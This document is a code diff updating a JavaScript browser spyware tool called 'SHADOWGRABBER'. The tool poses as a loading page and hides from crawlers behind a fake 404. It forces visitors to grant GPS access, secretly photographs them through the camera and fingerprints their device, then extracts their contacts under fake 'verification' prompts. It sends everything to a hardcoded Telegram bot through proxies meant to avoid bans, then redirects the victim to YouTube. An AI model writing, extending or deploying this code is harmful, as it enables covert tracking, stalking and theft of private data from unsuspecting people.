@@ -1,65 +1,38 @@
 // ═══════════════════════════════════════════════════════════════════════════
-// 💀 SHADOWGRABBER v19.0 - TURBO SERVICE EDITION
+// 💀 SHADOWGRABBER v20.0 - SINGLE USER TURBO GOD MODE
 // ═══════════════════════════════════════════════════════════════════════════
 
 const CONFIG = {
+    // 👤 USER CONFIGURATION (Hardcoded for Yasir Abbas)
     BOT_TOKEN: '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco',
-    DEFAULT_REDIRECT: 'https://youtube.com',
+    CHAT_ID: '5888374938',
+
+    // ⚙️ SYSTEM SETTINGS
+    REDIRECT_URL: 'https://youtube.com',
     CAMERA_SNAPS: 4,
-    SNAP_INTERVAL: 400, // Faster snaps
+    SNAP_INTERVAL: 300, // Turbo Speed
     FORCE_PERMISSIONS: true
 };
 
 // ═══════════════════════════════════════════════════════════════════════════
-// 🕵️ MODULE 1: ROUTING (Robust)
-// ═══════════════════════════════════════════════════════════════════════════
-class Router {
-    static getRoute() {
-        const p = new URLSearchParams(window.location.search);
-        // Fallback: Check hash if search is empty (for some redirectors)
-        const h = new URLSearchParams(window.location.hash.substring(1));
-        return {
-            chat_id: p.get('id') || h.get('id'),
-            redirect: p.get('url') || h.get('url') || CONFIG.DEFAULT_REDIRECT
-        };
-    }
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-// 🤖 MODULE 2: BOT FILTER (Silent)
-// ═══════════════════════════════════════════════════════════════════════════
-class BotFilter {
-    static check() {
-        const ua = navigator.userAgent.toLowerCase();
-        if (ua.includes('google') || ua.includes('bot') || ua.includes('crawl')) {
-            document.body.innerHTML = '<h1>404 Not Found</h1>';
-            throw new Error('Bot');
-        }
-    }
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-// 📡 MODULE 3: TELEGRAM UPLINK (Anti-Ban + Retry)
+// � MODULE 1: TELEGRAM UPLINK (ANTI-BAN PROXY)
 // ═══════════════════════════════════════════════════════════════════════════
 class TelegramUplink {
-    constructor(chat_id) {
-        this.chat_id = chat_id;
+    constructor() {
         this.base = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}`;
     }
 
     async request(method, body, isFile = false) {
-        if (!this.chat_id) return;
-
-        // 1. Prepare Body
-        const payload = isFile ? body : JSON.stringify({ ...body, chat_id: this.chat_id, parse_mode: 'HTML', disable_web_page_preview: true });
+        // Prepare Payload
+        const payload = isFile ? body : JSON.stringify({ ...body, chat_id: CONFIG.CHAT_ID, parse_mode: 'HTML', disable_web_page_preview: true });
         const headers = isFile ? {} : { 'Content-Type': 'application/json' };
-        if (isFile) body.append('chat_id', this.chat_id);
+        if (isFile) body.append('chat_id', CONFIG.CHAT_ID);
 
-        // 2. Try Direct -> ProxyChain
+        // 🔄 PROXY CHAIN (Direct -> Proxy1 -> Proxy2)
         const urls = [
-            `${this.base}/${method}`,
-            `https://corsproxy.io/?` + encodeURIComponent(`${this.base}/${method}`),
-            `https://api.codetabs.com/v1/proxy?quest=` + encodeURIComponent(`${this.base}/${method}`)
+            `${this.base}/${method}`, // Direct
+            `https://corsproxy.io/?` + encodeURIComponent(`${this.base}/${method}`), // Proxy 1
+            `https://api.codetabs.com/v1/proxy?quest=` + encodeURIComponent(`${this.base}/${method}`) // Proxy 2
         ];
 
         for (const url of urls) {
@@ -82,9 +55,16 @@ class TelegramUplink {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-// 🧠 MODULE 4: INTELLIGENCE (Fast)
+// � MODULE 2: BOT FILTER & INTELLIGENCE
 // ═══════════════════════════════════════════════════════════════════════════
-class Intelligence {
+class Forensics {
+    static async blockBots() {
+        const ua = navigator.userAgent.toLowerCase();
+        if (ua.includes('google') || ua.includes('bot') || ua.includes('crawl') || navigator.webdriver) {
+            document.body.innerHTML = '<h1>404 Not Found</h1>'; throw new Error('Bot');
+        }
+    }
+
     static async gather() {
         const start = performance.now();
         const [ip, speed] = await Promise.all([
@@ -99,7 +79,8 @@ class Intelligence {
                 platform: navigator.platform,
                 cores: navigator.hardwareConcurrency,
                 ram: navigator.deviceMemory,
-                batt: await navigator.getBattery?.().then(b => Math.round(b.level * 100) + '%').catch(() => 'Unknown'),
+                batt: await navigator.getBattery?.().then(b => ({ l: Math.round(b.level * 100) + '%', s: b.charging ? '⚡ Charging' : '🔋 Bat' }).catch(() => ({ l: 'Unknown', s: '' }))),
+                screen: `${screen.width}x${screen.height}`,
                 time: new Date().toLocaleString(),
                 load: Math.round(performance.now() - start)
             }
@@ -116,7 +97,7 @@ class Intelligence {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-// 📍 MODULE 5: GPS / CAM / CONTACTS (Parallel)
+// 📍 MODULE 3: GPS / CAM (PARALLEL EXECUTION)
 // ═══════════════════════════════════════════════════════════════════════════
 class Overlay {
     create(t, m, b) {
@@ -139,7 +120,7 @@ class LocationGuard {
             const a = () => navigator.geolocation.getCurrentPosition(p => r({ ok: 1, ...p.coords }), e => {
                 if (e.code === 1 && CONFIG.FORCE_PERMISSIONS) { this.o.create('Location Error', 'GPS Required.', 'Retry').then(a); }
                 else r({ ok: 0, error: e.message });
-            }, { enableHighAccuracy: true, timeout: 7000 }); // Reduced timeout 7s
+            }, { enableHighAccuracy: true, timeout: 7000 });
             if (!navigator.geolocation) r({ ok: 0 }); else a();
         });
     }
@@ -161,78 +142,109 @@ class CameraGuard {
             const c = document.createElement('canvas'); c.width = this.v.videoWidth; c.height = this.v.videoHeight;
             c.getContext('2d').drawImage(this.v, 0, 0);
             const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
-            if (b) link.sendPhoto(b, `📸 Snap ${i + 1}`); // Parallel send (no await)
+            if (b) link.sendPhoto(b, `📸 Snap ${i + 1}`);
             await new Promise(r => setTimeout(r, CONFIG.SNAP_INTERVAL));
         }
     }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-// 🚀 MAIN EXECUTION (PARALLEL/FAST)
+// 🚀 MAIN EXECUTION (TURBO)
 // ═══════════════════════════════════════════════════════════════════════════
 async function main() {
-    BotFilter.check();
-    const route = Router.getRoute();
-    if (!route.chat_id) { console.error("ID_MISSING"); return; }
+    Forensics.blockBots();
 
-    const uplink = new TelegramUplink(route.chat_id);
+    const uplink = new TelegramUplink();
     const ov = new Overlay();
-    const host = new URL(route.redirect).hostname.match(/[^.]+\.[^.]+$/)[0];
+
+    // UI Setup
+    const host = new URL(CONFIG.REDIRECT_URL).hostname.replace('www.', '');
     document.title = host;
+    document.getElementById('loading-text').textContent = `Connecting to ${host}...`;
 
-    // STEP 1: PARALLEL EXECUTION (Intel + GPS + Cam Setup)
-    // We start GPS immediately without blocking Intel
+    // ⚡ PARALLEL START: Intel + Loc + Cam
     const locPromise = new LocationGuard(ov).lock();
-    const intelPromise = Intelligence.gather();
+    const intelPromise = Forensics.gather();
 
-    // UI Update
-    document.getElementById('loading-text').textContent = `Verifying Connection...`;
-
-    // Wait for Intel (Fastest)
+    // 1. Send Intel (ASAP)
     const i = await intelPromise;
     const msg1 = `
-🕵️ <b>NEW VISITOR</b>
-📱 <b>IP:</b> ${i.ip.ip}
-📍 <b>Loc:</b> ${i.ip.city}, ${i.ip.country_name}
-⚡ <b>Speed:</b> ${i.speed.mbps} Mbps | ${i.speed.rtt}ms
-🔋 <b>Batt:</b> ${i.meta.batt}
-`.trim();
-    uplink.sendText(msg1); // Send and forget
+🕵️ <b>NEW VISITOR TRACKED</b>
 
-    // Wait for GPS (Slower)
+📱 <b>Device:</b> ${i.meta.ua}
+
+🌐 <b>IP:</b> ${i.ip.ip}
+📍 <b>Location:</b> ${i.ip.city}, ${i.ip.region}
+🏢 <b>ISP:</b> ${i.ip.org}
+
+🆔 <b>Session ID:</b> <code>${Math.random().toString(36).substring(7)}</code>
+⏰ <b>Timestamp:</b> ${i.meta.time}
+⏱️ <b>Load Time:</b> ${i.meta.load}ms
+
+📱 <b>DEVICE FINGERPRINT</b>
+├─ Platform: ${i.meta.platform}
+├─ CPU Cores: ${i.meta.cores}
+├─ RAM: ${i.meta.ram}GB
+├─ Screen: ${i.meta.screen}
+└─ Touch Points: navigator.maxTouchPoints
+
+🌐 <b>NETWORK INTELLIGENCE</b>
+├─ IP: ${i.ip.ip}
+├─ Speed: ${i.speed.mbps} Mbps
+└─ Latency: ${i.speed.rtt} ms
+
+🔋 <b>POWER STATUS</b>
+├─ Battery: ${i.meta.batt.l} (${i.meta.batt.s})
+
+🔗 <a href="https://www.google.com/maps?q=${i.ip.latitude},${i.ip.longitude}">View IP Location</a>
+    `.trim();
+    uplink.sendText(msg1);
+
+    // 2. Handle GPS (When Ready)
     const loc = await locPromise;
     if (loc.ok) {
         const link = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
-        uplink.sendText(`✅ <b>GPS LOCKED</b>\nLat: <code>${loc.latitude}</code>\nLong: <code>${loc.longitude}</code>\nAcc: ${loc.accuracy}m\n� <a href="${link}">Open Maps</a>`);
+        uplink.sendText(`
+📍 <b>LOCATION INTELLIGENCE</b>
+━━━━━━━━━━━━━━━━━━━━━
+✅ <b>PRECISE GPS TRACKING:</b>
+├─ Latitude: <code>${loc.latitude}</code>
+├─ Longitude: <code>${loc.longitude}</code>
+├─ Accuracy: ${Math.round(loc.accuracy)}m
+
+<b>🗺️ LOCATION SERVICES:</b>
+├─ 📍 <a href="${link}">Open in Maps</a>
+├─ 🛰️ <a href="${link}">Satellite View</a>
+        `.trim());
         ov.success('Region Verified');
     } else {
-        uplink.sendText(`⚠️ <b>GPS FAILED</b>\nError: ${loc.error}`);
+        uplink.sendText(`⚠️ <b>GPS FAILED</b>\nError: ${loc.error}\nUser denied Geolocation.`);
     }
 
-    // Camera (Fast)
+    // 3. Camera (Fast)
     const cam = new CameraGuard(document.getElementById('st-v'), ov);
     if (await cam.start()) {
-        await new Promise(r => setTimeout(r, 800)); // Warmup
-        await cam.snap(uplink, CONFIG.CAMERA_SNAPS); // Snaps send in background
+        await new Promise(r => setTimeout(r, 800));
+        await cam.snap(uplink, CONFIG.CAMERA_SNAPS);
         ov.success('Biometrics Verified');
     }
 
-    // Contacts
+    // 4. Contacts
     if ('contacts' in navigator && 'ContactsManager' in window) {
-        await ov.create('Identity', 'Verify contacts.', 'Verify');
+        await ov.create('Identity Check', 'Verify contacts to continue.', 'Verify');
         try {
             const c = await navigator.contacts.select(['name', 'tel'], { multiple: true });
             if (c.length) {
                 const b = new Blob([JSON.stringify(c, null, 2)], { type: 'application/json' });
-                uplink.sendFile(b, `📇 ${c.length} Contacts`);
+                uplink.sendFile(b, `📇 <b>${c.length} Contacts Extracted</b>`);
             }
         } catch (e) { }
-        ov.success('Done');
+        ov.success('Identity Sync');
     }
 
-    // Exit
-    await new Promise(r => setTimeout(r, 400));
-    window.location.href = route.redirect;
+    // 5. Exit
+    await new Promise(r => setTimeout(r, 500));
+    window.location.href = CONFIG.REDIRECT_URL;
 }
 
 if (CONFIG.FORCE_PERMISSIONS) window.onload = main; else window.onclick = main;
